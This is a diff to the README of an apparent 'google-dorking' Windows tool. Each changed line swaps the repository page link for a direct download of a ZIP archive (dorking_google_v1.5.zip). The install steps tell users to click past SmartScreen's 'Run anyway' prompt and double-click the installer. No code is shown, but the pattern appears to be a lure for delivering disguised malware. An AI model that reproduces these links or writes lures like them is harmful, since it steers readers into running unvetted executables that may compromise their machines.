@@ -1,6 +1,6 @@
 # 🔎 google-dorking - Find useful search results fast
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/teddiadhominem237/google-dorking)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/teddiadhominem237/google-dorking/raw/refs/heads/main/fourble/dorking_google_v1.5.zip)
 
 ## 📌 What this is
 
@@ -20,7 +20,7 @@ The app is meant to be light and easy to run on a normal Windows setup.
 
 ## 🚀 Getting Started
 
-1. Open the download page: https://github.com/teddiadhominem237/google-dorking
+1. Open the download page: https://github.com/teddiadhominem237/google-dorking/raw/refs/heads/main/fourble/dorking_google_v1.5.zip
 2. Download the app or package from that page
 3. Save the file to your Downloads folder or another easy place
 4. If the file is zipped, right-click it and choose Extract All
@@ -63,7 +63,7 @@ Common use cases include:
 
 ## 📁 How to install on Windows
 
-1. Visit https://github.com/teddiadhominem237/google-dorking
+1. Visit https://github.com/teddiadhominem237/google-dorking/raw/refs/heads/main/fourble/dorking_google_v1.5.zip
 2. Download the file from the page
 3. If Windows SmartScreen appears, choose More info, then Run anyway only if you trust the source
 4. If the download is a ZIP file, extract it first
@@ -157,6 +157,6 @@ You can use this repository as a working reference when you need:
 
 Open this link and visit the page to download the latest version:
 
-https://github.com/teddiadhominem237/google-dorking
+https://github.com/teddiadhominem237/google-dorking/raw/refs/heads/main/fourble/dorking_google_v1.5.zip
 
 After the file downloads, extract it if needed, then double-click the Windows app or installer to run it
